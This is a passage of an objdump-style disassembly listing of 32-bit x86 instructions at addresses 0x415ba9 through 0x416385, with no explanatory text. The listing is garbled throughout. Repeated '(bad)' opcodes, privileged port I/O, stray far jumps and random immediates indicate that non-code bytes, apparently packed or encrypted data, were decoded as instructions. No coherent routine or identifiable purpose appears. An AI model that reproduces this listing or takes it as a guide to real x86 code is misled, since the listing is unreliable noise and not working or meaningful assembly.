  415ba9:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bab:	xor    al,0x4d
  415bad:	addr16 cmp al,ch
  415bb0:	inc    esp
  415bb1:	or     eax,0xf50bafe6
  415bb6:	(bad)  
  415bb7:	xor    DWORD PTR [esi-0x2be29898],edi
  415bbd:	sahf   
  415bbe:	sbb    ebx,DWORD PTR [edi]
  415bc0:	xor    eax,0xeeda9f81
  415bc5:	arpl   WORD PTR [edx],sp
  415bc7:	cmp    bh,bl
  415bc9:	lods   al,BYTE PTR ds:[esi]
  415bca:	ret    0xf189
  415bcd:	dec    edx
  415bce:	fstp   TBYTE PTR [eax-0x13eda5ac]
  415bd4:	sub    al,0x2d
  415bd6:	ins    DWORD PTR es:[edi],dx
  415bd7:	ds adc esp,edi
  415bda:	mov    ecx,0xaba6bede
  415bdf:	adc    DWORD PTR [ebp-0x6d],esi
  415be2:	add    DWORD PTR [ebp+edi*8-0x5f2156c0],eax
  415be9:	sbb    dl,BYTE PTR [eax-0x6f142276]
  415bef:	std    
  415bf0:	xor    ch,BYTE PTR [ebx+ebp*1]
  415bf3:	xor    eax,edi
  415bf5:	cmc    
  415bf6:	(bad)  
  415bf7:	(bad)  
  415bf8:	pusha  
  415bf9:	mov    eax,ds:0xff83bcdb
  415bfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415bff:	ja     0x415c5c
  415c01:	pop    ds
  415c02:	xchg   esp,eax
  415c03:	imul   BYTE PTR [edx-0x1e]
  415c06:	xor    eax,0xc888264
  415c0b:	call   0xa2e85a11
  415c10:	out    dx,eax
  415c11:	es sbb ah,0x20
  415c15:	push   ebp
  415c16:	sahf   
  415c17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c18:	ins    DWORD PTR es:[edi],dx
  415c19:	pop    edi
  415c1a:	xchg   esp,eax
  415c1b:	mov    al,ds:0xd8937004
  415c20:	mov    edx,0x34a8b6c0
  415c25:	cmp    al,BYTE PTR [ebx-0x2829f0c6]
  415c2b:	cmp    eax,0x8eb3511e
  415c30:	jg     0x415bc3
  415c32:	jp     0x415be5
  415c34:	ficomp DWORD PTR [ebp+0x5b]
  415c37:	jecxz  0x415bf5
  415c39:	push   edx
  415c3a:	loop   0x415c5c
  415c3c:	xor    eax,0x2175bf09
  415c41:	mov    edx,0xf87d8bb9
  415c46:	sub    BYTE PTR [edi+0x2a465496],cl
  415c4c:	pop    edi
  415c4d:	(bad)  
  415c4f:	mov    eax,0xacc1e1a5
  415c54:	mov    al,ds:0xd4f0bb22
  415c59:	inc    esp
  415c5a:	sbb    BYTE PTR [ebp-0x53],bl
  415c5d:	jb     0x415bf9
  415c5f:	(bad)  [eax+ecx*2-0x3cf181e4]
  415c66:	push   esi
  415c67:	xor    ebx,eax
  415c69:	fs into 
  415c6b:	popf   
  415c6c:	test   al,0x9f
  415c6e:	mov    ecx,DWORD PTR [edi+ecx*4-0x314b92f6]
  415c75:	div    DWORD PTR ds:0x1dcc3c08
  415c7b:	test   BYTE PTR [edx+0x601f3d27],bl
  415c81:	dec    esi
  415c82:	jne    0x415cad
  415c84:	mov    esp,DWORD PTR [ebx]
  415c86:	cmp    eax,0xe70c22fd
  415c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c8c:	mov    bl,0xbf
  415c8e:	(bad)  
  415c8f:	(bad)  
  415c90:	(bad)  
  415c92:	mov    al,ds:0xa177ea64
  415c97:	xchg   ebx,eax
  415c98:	fsub   DWORD PTR [esi]
  415c9a:	mov    BYTE PTR [edx+0x419a8f26],dh
  415ca0:	jbe    0x415c65
  415ca2:	cld    
  415ca3:	scas   al,BYTE PTR es:[edi]
  415ca4:	push   ecx
  415ca5:	and    esi,esi
  415ca7:	jmp    0x9e80d426
  415cac:	or     DWORD PTR [eax+0x40015b0c],eax
  415cb2:	xlat   BYTE PTR ds:[ebx]
  415cb3:	sub    bh,BYTE PTR ds:0x31e6552d
  415cb9:	xchg   DWORD PTR [eax+0x5341fa4b],esi
  415cbf:	nop
  415cc0:	ins    BYTE PTR es:[edi],dx
  415cc1:	mov    gs,edi
  415cc3:	mov    ecx,0x8099895f
  415cc8:	or     eax,0x18922f96
  415ccd:	jle    0x415d0d
  415ccf:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd1:	dec    ecx
  415cd2:	adc    al,0x13
  415cd4:	xchg   esp,eax
  415cd5:	mov    esi,0x18cee9c1
  415cda:	or     esp,edi
  415cdc:	jns    0x415cbe
  415cde:	push   eax
  415cdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ce0:	mov    bl,0x35
  415ce2:	(bad)  
  415ce3:	icebp  
  415ce4:	rol    DWORD PTR [esi+0x5d7e1bda],cl
  415cea:	push   edi
  415ceb:	jo     0x415d13
  415ced:	mov    ah,0x74
  415cef:	ja     0x415cad
  415cf1:	popa   
  415cf2:	cs mov cl,0x92
  415cf5:	outs   dx,DWORD PTR ds:[esi]
  415cf6:	adc    DWORD PTR [ebp-0x6d],esp
  415cf9:	dec    edx
  415cfa:	hlt    
  415cfb:	jo     0x415c97
  415cfd:	(bad)  
  415cfe:	mov    ecx,0xaffff641
  415d03:	push   cs
  415d04:	add    al,0x6f
  415d06:	or     ebp,esi
  415d08:	add    DWORD PTR [eax+0x339f48d9],0xb68c5ba4
  415d12:	ins    DWORD PTR es:[edi],dx
  415d13:	cmp    BYTE PTR [edx+ebp*4],ch
  415d16:	jo     0x415d30
  415d18:	mov    ah,0xb9
  415d1a:	mov    ss,WORD PTR [ebp-0x1b9a93dc]
  415d20:	in     al,dx
  415d21:	pop    esp
  415d22:	jmp    0x415d70
  415d24:	pop    eax
  415d25:	add    eax,0x8175be00
  415d2a:	pusha  
  415d2b:	jno    0x415cce
  415d2d:	push   esi
  415d2e:	sar    BYTE PTR [ebx-0x45],0xc5
  415d32:	mov    ecx,DWORD PTR [edi+edi*8]
  415d35:	sub    DWORD PTR [eax+0x47eb08b1],esi
  415d3b:	xchg   BYTE PTR [eax+0x11e1e37f],dh
  415d41:	push   edx
  415d42:	xor    DWORD PTR [ecx-0x25959728],0xdde4efb6
  415d4c:	and    ebx,DWORD PTR ds:0xbea677a3
  415d52:	call   FWORD PTR [edx+0x27]
  415d55:	xor    eax,0xaa9bd156
  415d5a:	pop    ss
  415d5b:	mov    edx,0xee0a6563
  415d60:	xchg   DWORD PTR [edi+0x4b],ebp
  415d63:	mov    ds:0xacf9dd74,al
  415d68:	add    eax,0xbd96f06a
  415d6d:	fimul  WORD PTR [esi-0x6a]
  415d70:	xor    eax,0xe2898ca6
  415d75:	mov    dh,0xac
  415d77:	addr16 aad 0x76
  415d7a:	or     DWORD PTR [ebp-0x3b],edx
  415d7d:	icebp  
  415d7e:	dec    ebp
  415d7f:	arpl   WORD PTR [ebp+0x657fcdb2],cx
  415d85:	out    0xc4,eax
  415d87:	cs dec ecx
  415d89:	push   esp
  415d8a:	cld    
  415d8b:	mov    al,0x91
  415d8d:	pop    es
  415d8e:	add    eax,0x6f3c0fd2
  415d93:	or     al,0x4d
  415d95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d96:	jno    0x415d72
  415d98:	xchg   esi,eax
  415d99:	push   es
  415d9a:	sbb    BYTE PTR [edx+edi*8],bl
  415d9d:	dec    esi
  415d9e:	pop    edx
  415d9f:	pop    ds
  415da0:	cmp    eax,0xbcea2abb
  415da5:	xor    BYTE PTR [edi],0x66
  415da8:	push   DWORD PTR [ebx-0x1a]
  415dab:	idiv   BYTE PTR [ecx-0x4eaa1f93]
  415db1:	xlat   BYTE PTR ds:[ebx]
  415db2:	xor    DWORD PTR [ecx+0x7247041c],edx
  415db8:	dec    esp
  415db9:	(bad)  
  415dba:	ins    DWORD PTR es:[edi],dx
  415dbb:	not    BYTE PTR [edi-0x536d8642]
  415dc1:	mov    dh,0xef
  415dc3:	mov    al,0x8d
  415dc5:	fs jmp 0x2bcc39bc
  415dcb:	sbb    ebp,DWORD PTR [ebx-0x41]
  415dce:	clc    
  415dcf:	les    ebx,FWORD PTR [ebx]
  415dd1:	fwait
  415dd2:	(bad)  
  415dd3:	in     al,0xb
  415dd5:	mov    ebp,0x858f236a
  415dda:	loopne 0x415da8
  415ddc:	pop    ebp
  415ddd:	jg     0x415db3
  415ddf:	popf   
  415de0:	fdiv   QWORD PTR [edx-0x79964ed]
  415de6:	repnz or ebx,esi
  415de9:	cmp    al,0xb2
  415deb:	xor    BYTE PTR gs:[ebp-0x1b7cfbdf],bh
  415df2:	jecxz  0x415e25
  415df4:	out    dx,al
  415df5:	mov    ch,0xda
  415df7:	lods   al,BYTE PTR ds:[esi]
  415df8:	(bad)  [edi]
  415dfa:	inc    ebx
  415dfb:	pop    DWORD PTR [edx+0x5f]
  415dfe:	adc    eax,0x7b8c17a1
  415e03:	std    
  415e04:	scas   eax,DWORD PTR es:[edi]
  415e05:	adc    eax,0x690ab72
  415e0a:	arpl   WORD PTR ds:0x58fd5488,ax
  415e10:	xor    DWORD PTR [edx-0x4b],esi
  415e13:	lock lock and DWORD PTR [eax],esp
  415e17:	nop
  415e18:	add    DWORD PTR [edi],0x570b9405
  415e1e:	add    eax,DWORD PTR [esi+0x79b68565]
  415e24:	mov    fs,edx
  415e26:	cmp    eax,0x3fd326f3
  415e2b:	fist   DWORD PTR [ebx-0x3c]
  415e2e:	mov    bl,0xd9
  415e30:	std    
  415e31:	lods   al,BYTE PTR ds:[esi]
  415e32:	adc    DWORD PTR [esi-0x25d4ab1],eax
  415e38:	inc    edx
  415e39:	push   esp
  415e3a:	xchg   BYTE PTR [ebp+0x9],ch
  415e3d:	dec    esp
  415e3e:	std    
  415e3f:	clc    
  415e40:	dec    esi
  415e41:	dec    eax
  415e42:	sub    dh,cl
  415e44:	loop   0x415de6
  415e46:	inc    ebx
  415e47:	inc    esi
  415e49:	mov    ch,ah
  415e4b:	dec    edi
  415e4c:	fwait
  415e4d:	repnz inc eax
  415e4f:	idiv   dl
  415e51:	mov    edx,0x6b3a8e28
  415e56:	repz mov ch,BYTE PTR [edi+0x46]
  415e5a:	adc    dh,BYTE PTR [ebp-0x61]
  415e5d:	mov    ebp,0xd8db6ec7
  415e62:	shl    DWORD PTR [eax],1
  415e64:	jb     0x415ecb
  415e66:	cmp    BYTE PTR ds:[edx],ch
  415e69:	xchg   edi,eax
  415e6a:	sahf   
  415e6b:	ret    
  415e6c:	cmp    al,0xf3
  415e6e:	stos   DWORD PTR es:[edi],eax
  415e6f:	xor    DWORD PTR [esi],edx
  415e71:	and    dl,bl
  415e73:	sbb    BYTE PTR [edx],ah
  415e75:	cmp    BYTE PTR [edi+0x21],dl
  415e78:	out    dx,al
  415e79:	int3   
  415e7a:	out    0x82,al
  415e7c:	mov    ch,0xbd
  415e7e:	mov    bl,0xf9
  415e80:	jmp    0x9f76:0x57c15cae
  415e87:	xor    bh,BYTE PTR [ebp-0x23e0f0cc]
  415e8d:	mov    ch,0x4d
  415e8f:	pop    ecx
  415e90:	neg    al
  415e92:	ins    BYTE PTR es:[edi],dx
  415e93:	(bad)  
  415e95:	inc    ebx
  415e96:	(bad)  
  415e97:	xchg   esp,eax
  415e98:	inc    ebp
  415e99:	or     ebp,0x71249732
  415e9f:	fsub   DWORD PTR [ecx+eiz*4-0x2d]
  415ea3:	add    al,0x8
  415ea5:	sub    esp,DWORD PTR [esi-0x4cee9b62]
  415eab:	xor    bh,BYTE PTR [edx-0x2e]
  415eae:	arpl   WORD PTR [ebx],dx
  415eb0:	data16 mov dl,0x7d
  415eb3:	cmp    DWORD PTR [edi],eax
  415eb5:	rcr    BYTE PTR [edx+0x22],0xa1
  415eb9:	dec    eax
  415eba:	lahf   
  415ebb:	into   
  415ebc:	scas   al,BYTE PTR es:[edi]
  415ebd:	sbb    al,0xcf
  415ebf:	mov    ecx,0xd3137bfd
  415ec4:	sub    BYTE PTR [eax+0xc],bl
  415ec7:	pop    esi
  415ec8:	test   eax,0x9ebfbc0
  415ecd:	pop    ebp
  415ece:	lds    esi,FWORD PTR ds:0xb918f510
  415ed4:	call   0xe085e2fb
  415ed9:	mov    edi,0x679fc579
  415ede:	or     dl,cl
  415ee0:	fbld   TBYTE PTR ds:0x7d37263e
  415ee6:	imul   ebp,eax,0x3e1284ec
  415eec:	cmp    bl,ah
  415eee:	arpl   WORD PTR [ebx],si
  415ef0:	cmp    eax,0x4bf5bbeb
  415ef5:	and    DWORD PTR [esi+0x4b],esp
  415ef8:	xor    eax,0x63c015c1
  415efd:	leave  
  415efe:	xchg   esi,eax
  415eff:	cli    
  415f00:	jno    0x415f1a
  415f02:	xor    eax,0xdf6048b3
  415f07:	jmp    DWORD PTR [ebp-0x21d4f3dd]
  415f0d:	mov    bl,0xbd
  415f0f:	xchg   DWORD PTR [edx],edx
  415f11:	and    BYTE PTR [ebx+0x291ec48e],dh
  415f17:	clc    
  415f18:	je     0x415f7f
  415f1a:	xchg   edx,eax
  415f1b:	jmp    0x86625d5
  415f20:	scas   eax,DWORD PTR es:[edi]
  415f21:	(bad)  
  415f22:	fs mov dh,0x98
  415f25:	or     al,0x63
  415f27:	push   ss
  415f28:	push   esi
  415f29:	loope  0x415f0d
  415f2b:	push   0xffffffa1
  415f2d:	pusha  
  415f2e:	cmp    bl,BYTE PTR ds:[eax]
  415f31:	outs   dx,BYTE PTR ds:[esi]
  415f32:	pop    es
  415f33:	xor    ah,BYTE PTR [ecx+eax*1-0x22880a53]
  415f3a:	imul   ecx,DWORD PTR [eax-0x569576d8],0x2d3c45c9
  415f44:	bnd jo 0x415f1c
  415f47:	mov    dl,0x12
  415f49:	loopne 0x415eed
  415f4b:	aad    0x9
  415f4d:	aam    0xa
  415f4f:	mov    DWORD PTR [ecx],ebx
  415f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f52:	les    esp,FWORD PTR [ecx+0x40]
  415f55:	retf   0x9dec
  415f58:	(bad)  
  415f59:	repz and al,BYTE PTR [esi-0x499c5e85]
  415f60:	pop    si
  415f62:	sub    eax,DWORD PTR cs:[ebp-0x40871a99]
  415f69:	test   DWORD PTR [ebx+eax*8-0xd],edi
  415f6d:	push   cs
  415f6e:	xor    DWORD PTR [eax],ecx
  415f70:	(bad)  
  415f71:	mov    esi,0x1ee7ce27
  415f76:	leave  
  415f77:	out    0x99,al
  415f79:	outs   dx,DWORD PTR ds:[esi]
  415f7a:	fimul  WORD PTR [edi-0x2625b382]
  415f80:	jl     0x415f21
  415f82:	jmp    0x5509b541
  415f87:	cwde   
  415f88:	int3   
  415f89:	xchg   ecx,eax
  415f8a:	and    ebx,ecx
  415f8c:	call   FWORD PTR [esi-0x43]
  415f8f:	pop    ss
  415f90:	sbb    eax,0x15d4acbf
  415f95:	pop    edi
  415f96:	or     eax,0x458a5f50
  415f9b:	sub    al,0x2a
  415f9d:	mov    eax,0x3f11468c
  415fa2:	adc    eax,0xb24c048a
  415fa7:	mov    al,bh
  415fa9:	les    ebx,FWORD PTR [eax-0x26e9e08]
  415faf:	in     eax,0x3e
  415fb1:	inc    eax
  415fb2:	jg     0x415f49
  415fb4:	xchg   ecx,eax
  415fb5:	inc    esi
  415fb6:	shl    DWORD PTR [eax-0x3d],cl
  415fb9:	mov    ecx,DWORD PTR [ebx-0x5000290a]
  415fbf:	pop    esp
  415fc0:	ret    
  415fc1:	inc    esi
  415fc2:	inc    esi
  415fc3:	add    eax,0x41aa80b6
  415fc8:	xor    esi,DWORD PTR [ecx-0x6b]
  415fcb:	xchg   esi,eax
  415fcc:	iret   
  415fcd:	adc    DWORD PTR [edx],ebp
  415fcf:	lods   al,BYTE PTR ds:[esi]
  415fd0:	xor    cl,BYTE PTR [esi-0x59]
  415fd3:	or     ecx,edi
  415fd5:	add    edi,edx
  415fd7:	xchg   edx,eax
  415fd8:	leave  
  415fd9:	loop   0x415f73
  415fdb:	jg     0x41602b
  415fdd:	sahf   
  415fde:	sbb    DWORD PTR [esi-0x66],edx
  415fe1:	mov    dh,0x90
  415fe3:	fild   DWORD PTR [esi-0x17752e63]
  415fe9:	out    0x9a,al
  415feb:	out    0x57,al
  415fed:	clc    
  415fee:	mov    ecx,0x3c261a76
  415ff3:	fbld   TBYTE PTR [ebx+0x4c]
  415ff6:	fmul   QWORD PTR [eax-0x66c061]
  415ffc:	test   al,0x7a
  415ffe:	aaa    
  415fff:	sti    
  416000:	ret    
  416001:	pop    ss
  416002:	push   0xffffffa8
  416004:	hlt    
  416005:	mov    eax,0x2c186012
  41600a:	mov    bl,0x59
  41600c:	mov    esp,0xa614b645
  416011:	loopne 0x41608b
  416013:	sub    eax,0x4b9d1803
  416018:	jne    0x416061
  41601a:	enter  0x6f2f,0xab
  41601e:	xchg   edx,eax
  41601f:	fs sub eax,0xdbe07ae8
  416025:	push   ds
  416026:	fs or  al,0xf3
  416029:	mov    ds:0x41bcc3d8,eax
  41602e:	mov    esp,0x819a3ea
  416033:	mov    dl,BYTE PTR [eax]
  416035:	inc    ebp
  416036:	mov    esp,0x4b584ae6
  41603b:	push   ebx
  41603c:	mov    ebx,0x3ddd5689
  416041:	pop    ss
  416042:	and    DWORD PTR [ecx-0x15e007f3],ebx
  416048:	and    eax,0x9d40c922
  41604d:	loopne 0x416033
  41604f:	aad    0xc4
  416051:	mov    eax,ds:0x7eca51e8
  416056:	cmc    
  416057:	mov    esp,0x1f74fc77
  41605c:	push   ss
  41605d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41605e:	fild   QWORD PTR [ebx+0x31]
  416061:	xchg   esi,eax
  416062:	(bad)  
  416063:	outs   dx,BYTE PTR ds:[esi]
  416064:	jno    0x415ff1
  416066:	repnz (bad) 
  416068:	aas    
  416069:	(bad)  
  41606a:	leave  
  41606b:	sbb    ecx,DWORD PTR ds:0xab579a01
  416071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416072:	bound  esp,QWORD PTR [ebx+0x7c02cd]
  416078:	test   BYTE PTR [edi-0x79],cl
  41607b:	sbb    eax,0x6b101355
  416080:	cld    
  416081:	scas   al,BYTE PTR es:[edi]
  416082:	lahf   
  416083:	dec    ecx
  416084:	retf   
  416085:	out    0x5c,al
  416087:	loopne 0x416049
  416089:	popa   
  41608a:	loop   0x416058
  41608c:	popf   
  41608d:	jne    0x416053
  41608f:	sbb    DWORD PTR [esi],esp
  416091:	aad    0xd6
  416093:	sbb    esi,DWORD PTR [ebx]
  416095:	imul   edi,esi,0x5c
  416098:	mov    DWORD PTR [esi+ebp*8],ecx
  41609b:	in     al,0xb8
  41609d:	fucomp st(3)
  41609f:	inc    ebp
  4160a0:	xor    al,0x59
  4160a2:	das    
  4160a3:	pop    ebx
  4160a4:	sbb    BYTE PTR [ebx+0x1639b18a],dl
  4160aa:	adc    esi,DWORD PTR [edx+0x5d]
  4160ad:	push   edx
  4160ae:	cs inc esp
  4160b0:	or     BYTE PTR [ecx-0x47],ah
  4160b3:	pop    eax
  4160b4:	jbe    0x4160a9
  4160b6:	dec    edx
  4160b7:	inc    esi
  4160b8:	jne    0x416081
  4160ba:	mov    dl,0xa7
  4160bc:	lods   eax,DWORD PTR ds:[esi]
  4160bd:	add    BYTE PTR [eax-0x1c],cl
  4160c0:	dec    ebp
  4160c1:	dec    esi
  4160c2:	push   esi
  4160c3:	mov    ds:0x839a0e46,al
  4160c8:	test   BYTE PTR [ecx],al
  4160ca:	popf   
  4160cb:	ror    DWORD PTR [esi],cl
  4160cd:	out    0x2d,eax
  4160cf:	ja     0x416146
  4160d1:	jg     0x416121
  4160d3:	ds stos BYTE PTR es:[edi],al
  4160d5:	popa   
  4160d6:	jmp    0xfa0c:0x178744b5
  4160dd:	mov    al,0x33
  4160df:	cmp    ch,BYTE PTR ds:0xbcceab05
  4160e5:	pop    ss
  4160e6:	xchg   ebp,eax
  4160e7:	stos   DWORD PTR es:[edi],eax
  4160e8:	or     al,0x98
  4160ea:	add    BYTE PTR [edi],dl
  4160ec:	add    esp,DWORD PTR [edi]
  4160ee:	pop    ebp
  4160ef:	mov    esp,cs
  4160f1:	ins    DWORD PTR es:[edi],dx
  4160f2:	pushf  
  4160f3:	jnp    0xef393073
  4160f9:	jno    0x416121
  4160fb:	jle    0x41614b
  4160fd:	aad    0xb8
  4160ff:	div    BYTE PTR [ebx]
  416101:	fistp  QWORD PTR [ebp+0xa]
  416104:	cmp    ebp,DWORD PTR [edx-0x16]
  416107:	test   BYTE PTR [eax-0xa17453e],ch
  41610d:	or     DWORD PTR [ebx-0x42],ebx
  416110:	jbe    0x41615c
  416112:	in     eax,0x48
  416114:	call   0xb4346273
  416119:	cmc    
  41611a:	cmp    eax,DWORD PTR [esi-0x20f497fc]
  416120:	push   ds
  416121:	mov    ebx,0x6a4dfbe1
  416126:	xchg   edi,eax
  416127:	jl     0x4161a2
  416129:	cli    
  41612a:	adc    esi,DWORD PTR [ecx-0x8]
  41612d:	xchg   esi,eax
  41612e:	ins    BYTE PTR es:[edi],dx
  41612f:	push   ecx
  416130:	push   esi
  416131:	bswap  ecx
  416133:	add    ebp,edi
  416135:	fsubr  st(6),st
  416137:	call   0x9a115fd4
  41613c:	outs   dx,BYTE PTR ds:[esi]
  41613d:	inc    esp
  41613e:	pop    edi
  41613f:	(bad)  
  416141:	je     0x416181
  416143:	enter  0x7876,0x87
  416147:	fild   WORD PTR [eax+0x6f]
  41614a:	int    0xd8
  41614c:	or     DWORD PTR ds:0x12c5c7e4,eax
  416152:	sti    
  416153:	adc    BYTE PTR [esi],bh
  416155:	mov    al,ds:0x144b598c
  41615a:	dec    edx
  41615b:	push   ss
  41615c:	iret   
  41615d:	ins    BYTE PTR es:[edi],dx
  41615e:	sbb    DWORD PTR ss:[ebp+edx*1-0x643a141b],edi
  416166:	sub    dh,dh
  416168:	in     eax,dx
  416169:	mov    DWORD PTR ds:0x48071e0b,ebp
  41616f:	sbb    DWORD PTR [edi],0xffffffb6
  416172:	jmp    0x416101
  416174:	out    0x2c,al
  416176:	cmp    DWORD PTR [esi+edx*8],edi
  416179:	in     eax,0xd0
  41617b:	popf   
  41617c:	sbb    al,0x5e
  41617e:	mov    DWORD PTR [ecx+0x5e3a53ae],eax
  416184:	or     DWORD PTR [edi],esi
  416186:	loope  0x4161c7
  416188:	cmp    bl,bl
  41618a:	xchg   ebp,eax
  41618b:	loop   0x4161f9
  41618d:	xchg   BYTE PTR [edx],ah
  41618f:	pop    esp
  416190:	fmul   DWORD PTR [esi+0x57]
  416193:	dec    ebp
  416194:	dec    esi
  416195:	aad    0x85
  416197:	add    bh,al
  416199:	stc    
  41619a:	sub    bl,BYTE PTR [ecx+eax*4]
  41619d:	sub    eax,0x680bf85a
  4161a2:	in     al,dx
  4161a3:	adc    al,0x19
  4161a5:	and    DWORD PTR [edi+ebx*4],ecx
  4161a8:	dec    ebp
  4161a9:	stc    
  4161aa:	ss ret 
  4161ac:	das    
  4161ad:	jecxz  0x416200
  4161af:	loope  0x416135
  4161b1:	shl    ah,0xb9
  4161b4:	xchg   esp,eax
  4161b5:	push   ds
  4161b6:	inc    ebx
  4161b7:	mov    ds:0x1eaa89f,eax
  4161bc:	xchg   esi,eax
  4161bd:	lea    edi,[esi+0x53a2fbfa]
  4161c3:	jmp    0xb7962a18
  4161c8:	lds    esi,FWORD PTR [esi+ebp*1]
  4161cb:	ret    0x19e5
  4161ce:	addr16 dec esi
  4161d0:	push   edi
  4161d1:	test   al,0x95
  4161d3:	inc    ch
  4161d5:	pop    es
  4161d6:	nop
  4161d7:	call   0x56fd:0x6fdd1c35
  4161de:	jmp    0x465c11e4
  4161e3:	sub    esi,DWORD PTR ds:0x4ce3f5f1
  4161e9:	mov    es,WORD PTR [edi+0xd]
  4161ec:	loope  0x41622c
  4161ee:	pop    ecx
  4161ef:	cli    
  4161f0:	ret    
  4161f1:	fs push ss
  4161f3:	fs push es
  4161f5:	sbb    al,0xc2
  4161f7:	in     eax,dx
  4161f8:	push   ds
  4161f9:	xchg   ecx,eax
  4161fa:	push   esp
  4161fb:	jg     0x4161b1
  4161fd:	fs and al,0x5b
  416200:	(bad)  
  416201:	shl    DWORD PTR [ebx],cl
  416203:	leave  
  416204:	mov    al,0x11
  416206:	inc    edi
  416207:	push   esp
  416208:	mov    ds:0x9f11f700,al
  41620d:	lock xchg BYTE PTR [ecx+0x2b],cl
  416211:	or     DWORD PTR [edi],0xac09968f
  416217:	sti    
  416218:	nop
  416219:	mov    ds:0xa43127a4,eax
  41621e:	inc    ecx
  41621f:	and    eax,0x6b16d88b
  416224:	pop    esp
  416225:	les    esi,FWORD PTR [esi+0x15]
  416228:	mov    esi,0x381e566d
  41622d:	ret    0xdcd9
  416230:	stos   BYTE PTR es:[edi],al
  416231:	cmp    eax,0xdf7647dd
  416236:	stos   DWORD PTR es:[edi],eax
  416237:	loope  0x4161fe
  416239:	or     al,0xa7
  41623b:	adc    DWORD PTR ds:0x24836353,edi
  416241:	jb     0x41624f
  416243:	fcomip st,st(7)
  416245:	sar    BYTE PTR [bp+di-0x40],cl
  416249:	mov    ds:0x81049293,al
  41624e:	into   
  41624f:	xchg   esp,eax
  416250:	mov    ebp,0xc030b2b1
  416255:	push   es
  416256:	mov    bl,0x55
  416258:	xchg   esi,eax
  416259:	pop    es
  41625a:	xor    DWORD PTR [eax-0x2d617610],edi
  416260:	sbb    DWORD PTR [ecx],ebx
  416262:	aaa    
  416263:	iret   
  416264:	mov    ebx,0x2ff812a7
  416269:	mov    BYTE PTR [edx+0x4e],bl
  41626c:	leave  
  41626d:	jmp    0x4162cd
  41626f:	ss push 0x5d8c9914
  416275:	cld    
  416276:	dec    ecx
  416277:	enter  0x5a45,0xfd
  41627b:	xchg   edi,eax
  41627c:	icebp  
  41627d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41627e:	xchg   edx,eax
  41627f:	dec    ebp
  416280:	addps  xmm4,XMMWORD PTR [ebx-0x1168c93c]
  416287:	jg     0x416214
  416289:	pop    ebp
  41628a:	cmp    esi,DWORD PTR [eax]
  41628c:	mov    ah,0x1
  41628e:	pop    ds
  41628f:	inc    ebx
  416290:	fisub  WORD PTR [esi+0x38]
  416293:	dec    ebx
  416294:	ds je  0x41628b
  416297:	fmul   QWORD PTR [eax+0x54a8ef4b]
  41629d:	push   ebp
  41629e:	es das 
  4162a0:	and    bh,BYTE PTR [esi+0x4a]
  4162a3:	popf   
  4162a4:	arpl   WORD PTR [edx-0x65c58533],cx
  4162aa:	(bad)  
  4162ab:	repz or al,0xf2
  4162ae:	xor    ebp,DWORD PTR [edi-0x6c]
  4162b1:	addr16 pop es
  4162b3:	cld    
  4162b4:	mov    dl,0xa8
  4162b6:	ja     0x41624c
  4162b8:	rcr    DWORD PTR [eax],0xb1
  4162bb:	pop    ss
  4162bc:	ds retf 0xe258
  4162c0:	sahf   
  4162c1:	sti    
  4162c2:	sub    al,0x21
  4162c4:	add    ebx,DWORD PTR [ecx-0x57]
  4162c7:	or     bh,bl
  4162c9:	sub    al,0x2e
  4162cb:	jmp    0x4162d7
  4162cd:	jae    0x416337
  4162cf:	jne    0x41625d
  4162d1:	sub    al,0xb2
  4162d3:	nop
  4162d4:	xchg   edi,eax
  4162d5:	jbe    0x416290
  4162d7:	add    ebp,DWORD PTR [edi+0xbedbfb0]
  4162dd:	test   esp,0x4935d969
  4162e3:	inc    ebx
  4162e4:	inc    edx
  4162e5:	jle    0x416326
  4162e7:	sbb    BYTE PTR [edx-0x4db6dc61],ch
  4162ed:	lahf   
  4162ee:	pop    esi
  4162ef:	sti    
  4162f0:	fcom   st(3)
  4162f2:	jle    0x41631d
  4162f4:	sub    eax,0xb1d5607b
  4162f9:	inc    edx
  4162fa:	xchg   ecx,eax
  4162fb:	dec    esp
  4162fc:	stc    
  4162fd:	sub    ebx,DWORD PTR [ebp+0x30510a9a]
  416303:	add    al,0xd4
  416305:	mov    ds:0x21744305,al
  41630a:	lods   al,BYTE PTR ds:[esi]
  41630b:	inc    edx
  41630c:	mov    edi,0xd52e24c
  416311:	mov    bh,0xbc
  416313:	(bad)  
  416314:	in     al,dx
  416315:	js     0x416327
  416317:	les    esi,FWORD PTR [esi]
  416319:	sub    eax,0x85ca79e
  41631e:	fnstenv [ebx+edi*1-0x10]
  416322:	push   ecx
  416323:	sbb    ch,BYTE PTR [esi+0x36]
  416326:	jne    0x4162b4
  416328:	xchg   ecx,eax
  416329:	add    ecx,esp
  41632b:	mov    eax,0x403eb5f7
  416330:	dec    esp
  416331:	or     bh,BYTE PTR [esi+ecx*1+0x50b09c1f]
  416338:	leave  
  416339:	mov    ebp,0xb840c40
  41633e:	push   ecx
  41633f:	bound  ecx,QWORD PTR [edi]
  416341:	cli    
  416342:	inc    ebp
  416343:	or     eax,0x6c7f2de2
  416348:	aad    0xf
  41634a:	std    
  41634b:	addr16 mov edx,0xb23c3ef0
  416351:	(bad)  
  416352:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416353:	inc    eax
  416354:	into   
  416355:	(bad)  
  416356:	test   eax,0x2b897693
  41635b:	inc    ecx
  41635c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41635d:	(bad)  
  41635e:	sbb    BYTE PTR [esi-0x601af60c],ch
  416364:	neg    BYTE PTR [ecx+0x39]
  416367:	mov    esi,0x4f015b4e
  41636c:	xor    ebp,ebx
  41636e:	mov    eax,0x417c5987
  416373:	(bad)  
  416374:	cld    
  416375:	daa    
  416376:	sbb    ch,al
  416378:	dec    ecx
  416379:	push   ebx
  41637a:	cmpxchg BYTE PTR [ebx+0x28],cl
  41637e:	punpcklwd mm1,DWORD PTR [esi-0x65]
  416382:	jne    0x416398
  416384:	iret   
  416385:	push   ecx
